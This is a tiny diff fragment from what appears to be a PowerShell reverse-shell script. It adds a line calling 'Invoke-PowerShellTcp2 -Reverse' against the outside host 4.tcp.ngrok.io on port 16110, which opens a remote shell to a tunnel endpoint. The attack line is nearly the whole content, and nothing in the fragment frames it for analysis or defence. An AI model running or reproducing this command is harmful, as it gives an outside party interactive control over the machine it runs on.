@@ -88,4 +88,4 @@ function PowerCPPJ
     }
 }
 
-Invoke -Reverse -IPAddress 4.tcp.ngrok.io -Port 16110
+Invoke-PowerShellTcp2 -Reverse -IPAddress 4.tcp.ngrok.io -Port 16110
